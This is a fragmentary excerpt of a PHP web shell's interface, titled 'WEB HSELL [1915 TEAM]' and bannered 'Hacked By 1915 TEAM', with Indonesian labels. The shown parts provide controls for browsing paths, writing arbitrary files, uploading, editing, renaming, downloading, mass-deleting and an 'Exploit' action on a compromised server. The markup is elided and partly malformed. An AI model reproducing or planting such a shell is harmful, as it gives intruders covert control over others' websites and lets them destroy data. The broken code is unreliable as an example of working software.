...
<html>
	<head>
		...
		<title> WEB HSELL [1915 TEAM] </title>
...
<div class='container-fluid'>
	<div class='py-3' id='main'>
		...
		<center>			<div class='corner text-secondary anu'>Hacked By 1915 TEAM </div></center>
				<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><center><h4>$_n</h4></center></a>";
				if(isset($_GET['path'])){
					$path = $_GET['path'];
				} else {
					$path = getcwd();
...
<div class='mb-3'>
	...
	<div class='form-check'>
		...
		<br><br><br><br><i class='bi bi-folder'></i> Lokasi:
		<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'><br><br>
		<br><br><br><br><i class='bi bi-file-earmark'></i> Nama file:
		<input class='form-control btn-sm' type='text' name='d_file' placeholder='nama file' $_r>
		<br><br><br><br><i class='bi bi-file-earmark'></i> Isi file:
		<textarea class='form-control btn-sm' rows='7' name='script' placeholder='isi file' $_r></textarea><br>
...
<center><br><br>
	<form method='POST'>
		...
		<div class='input-group-append'><br><br>
			...
			<input class='btn btn-outline-light btn-sm' type='submit' name='start' value='mass delete'><br><br>
...
<center>
	<div class='input-group mb-3'><br><br>
		...
		<br><br><button class='btn btn-outline-light btn-sm' type='sumbit'><i class='bi bi-arrow-return-right'>Exploit</i></button><br><br>
	</div>
...
<center>
	<form method='POST' enctype='multipart/form-data'>
		<div class='input-group mb-3'><br><br>
			<input class='form-control form-control-sm' type='file' name='file[]' multiple='' $_r><br><br>
			<input class='btn btn-outline-light btn-sm' type='submit' name='upl' value='upload'><br><br>
...
echo "
	...
	<form method=\"POST\" action=\"?option&path=$path\">
		<div class=\"btn-group\">
			<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"ganti_nama\"><i class='bi bi-pencil-fill'></i>ganti_nama</button>
			<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"hapus\"><i class='bi bi-trash-fill'></i>hapus</button>
		</div>
...
echo "
	<td class=\"text-center\">
		<form method=\"POST\" action=\"?option&path=$path\">
			<div class=\"btn-group\">
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"edit\"><i class='bi bi-pencil-square'>edit</i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"ganti_nama\"><iclass='bibi-pencil-fill'>ganti_nama</i><button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"download\"><i class='bi bi-download'>download</i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"hapus\"><i class='bi bi-trash-fill'>hapus</i></button>
			</div>
...
color:green;
            align-items: center;
            background-image: url('https://top4top.us/do.php?img=15929');
    border-radius: 5px;
...
margin-left: 20%;
font-size: 40px;}
.text-center,btn btn-outline-light btn-sm{
margin-left: 20%;
